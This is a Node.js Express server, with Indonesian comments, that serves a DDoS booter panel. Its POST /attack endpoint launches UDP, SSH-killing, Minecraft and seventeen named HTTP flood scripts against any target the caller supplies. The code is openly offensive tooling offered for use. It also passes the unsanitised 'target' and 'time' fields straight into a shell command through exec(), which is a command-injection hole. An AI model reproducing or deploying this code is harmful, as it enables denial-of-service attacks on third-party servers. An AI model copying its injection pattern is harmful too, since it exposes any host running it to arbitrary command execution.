const express = require('express');
const bodyParser = require('body-parser');
const exec = require('child_process').exec;
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Serve file statis (HTML, JS, CSS)

// Halaman utama
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint serangan
app.post('/attack', (req, res) => {
  const { layer, target, method, time } = req.body;

  if (!target || !method || !time) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  let command;

  if (layer === 'layer4') {
    if (method === 'UDP') {
      command = `node ${__dirname}/cache/udp ${target} 22 proxy ${time}`;
    } else if (method === 'KillSSH') {
      command = `node ${__dirname}/cache/sshkiller ${target} 22 root ${time}`;
    } else if (method === 'Minecraft') {
      command = `node ${__dirname}/cache/StarsXMc ${target} 22 proxy ${time}`;
    } else {
      return res.status(400).json({ error: 'Invalid Layer 4 method' });
    }
  } else if (layer === 'layer7') {
    const layer7Methods = [
      'flood', 'floodapi', 'floodvip', 'floodv2',
      'tls', 'strike', 'hold', 'kill', 'h2-bypass',
      'storm', 'h2-flood', 'destroy', 'bypass', 'raw',
      'thunder', 'ninja', 'glory'
    ];

    if (!layer7Methods.includes(method)) {
      return res.status(400).json({ error: 'Invalid Layer 7 method' });
    }

    command = `node ${__dirname}/cache/${method}.js ${target} ${time}`;
  } else {
    return res.status(400).json({ error: 'Invalid layer' });
  }

  exec(command, (error, stdout, stderr) => {
    console.log(`Menjalankan: ${command}`);
    if (stdout) console.log(`Output:\n${stdout}`);
    if (stderr) console.log(`Stderr:\n${stderr}`);

    if (error) {
      return res.status(500).json({ error: `Execution error: ${stderr || error.message}` });
    }

    res.json({ status: 'Attack started', command, output: stdout });
  });
});

// Fallback 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server aktif di http://localhost:${port}`);
});
